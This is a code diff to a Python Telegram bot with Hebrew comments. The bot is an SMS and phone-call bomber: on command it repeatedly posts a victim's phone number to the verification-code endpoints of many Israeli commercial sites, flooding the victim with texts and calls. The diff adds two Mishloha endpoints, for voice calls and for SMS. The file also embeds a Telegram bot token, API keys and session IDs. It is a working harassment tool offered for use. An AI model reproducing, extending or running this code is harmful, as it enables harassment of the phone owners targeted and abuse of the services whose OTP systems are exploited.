@@ -19,8 +19,25 @@ API_TOKEN = '8620606926:AAFYojGPF-_ex76iTJtVEbgZaVvj1Tu2ivA'
 bot = telebot.TeleBot(API_TOKEN)
 
 def attack(m, target, rounds):
-    # רשימת ה-15 המנצחת
+    # התאמת מספר עם מקף עבור ה-API של משלוחה
+    target_dashed = f"{target[:3]}-{target[3:]}"
+    
+    # רשימת ה-17 המנצחת (SMS + שיחות)
     apis = [
+        # --- משלוחה: שיחה קולית ---
+        {
+            "n": "Mishloha Call", 
+            "u": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=c049beda-2a99-442c-afa9-db86ea140940&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54&sessionID=7d518ec4-795f-88a3-7686-08ac80628205&culture=he&apiVersion=2", 
+            "d": {"phoneNumber": target_dashed, "sourceFrom": "AuthJS", "isCalling": True, "sessionID": "7d518ec4-795f-88a3-7686-08ac80628205"}, 
+            "type": "json"
+        },
+        # --- משלוחה: SMS ---
+        {
+            "n": "Mishloha SMS", 
+            "u": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=c049beda-2a99-442c-afa9-db86ea140940&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54&sessionID=7d518ec4-795f-88a3-7686-08ac80628205&culture=he&apiVersion=2", 
+            "d": {"phoneNumber": target_dashed, "sourceFrom": "AuthJS", "isCalling": False, "sessionID": "7d518ec4-795f-88a3-7686-08ac80628205"}, 
+            "type": "json"
+        },
         {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json"},
         {"n": "GoMobile", "u": "https://api.gomobile.co.il/api/send-otp", "d": {"phone": target}, "type": "json"},
         {"n": "Onot", "u": "https://www.onot.co.il/customer/ajax/post/", "d": {"form_key": "cis1GHI1WxfdOMSR", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
@@ -46,29 +63,25 @@ def attack(m, target, rounds):
         for site in apis:
             try:
                 if site["type"] == "json":
-                    res = requests.post(site["u"], json=site["d"], headers=headers, timeout=5)
+                    res = requests.post(site["u"], json=site["d"], headers=headers, timeout=6)
                 else:
-                    res = requests.post(site["u"], data=site["d"], headers=headers, timeout=5)
+                    res = requests.post(site["u"], data=site["d"], headers=headers, timeout=6)
                 
-                if res.status_code in [200, 201]:
-                    round_success += 1
-                else:
-                    round_fail += 1
-            except:
-                round_fail += 1
+                if res.status_code in [200, 201]: round_success += 1
+                else: round_fail += 1
+            except: round_fail += 1
             
-            # --- הדיליי המהיר (0.1 שניות) ---
+            # דיליי מהיר של 0.1 שניות בין אתרים
             time.sleep(0.1)
         
         total_success += round_success
         total_fail += round_fail
-        
         bot.send_message(m.chat.id, f"⚡️ סבב {r+1} הושלם!\n✅ הצלחות: {round_success} | ❌ נכשלו: {round_fail}")
         
         if r < int(rounds) - 1:
-            time.sleep(1.2)
+            time.sleep(1.5) # הפסקה קלה בין סבבים
 
-    bot.send_message(m.chat.id, f"🏁 **סיכום הפצצה סופי:**\n📱 יעד: {target}\n✅ סה\"כ הצלחות: {total_success}\n❌ סה\"כ נכשלו: {total_fail}")
+    bot.send_message(m.chat.id, f"🏁 **הפצצה הושלמה!**\n✅ סה\"כ הצלחות: {total_success}\n❌ סה\"כ נכשלו: {total_fail}")
 
 @bot.message_handler(func=lambda m: True)
 def handle(m):
@@ -77,14 +90,14 @@ def handle(m):
         if len(parts) == 2:
             rounds, target = parts[0], parts[1]
             if rounds.isdigit() and target.isdigit() and len(target) >= 9:
-                bot.reply_to(m, f"🔥 מפעיל {rounds} סבבים על {target}...\n(15 אתרים פעילים!)")
+                bot.reply_to(m, f"🔥 מפעיל {rounds} סבבים של SMS ושיחות על {target}...\n(17 פעולות בכל סבב!)")
                 attack(m, target, rounds)
             else:
                 bot.reply_to(m, "פורמט: [סבבים] [מספר]")
         else:
             bot.reply_to(m, "לדוגמה: 2 0521234567")
     except:
-        bot.reply_to(m, "שגיאה.")
+        bot.reply_to(m, "שגיאה בביצוע הפעולה.")
 
 if __name__ == "__main__":
     keep_alive()
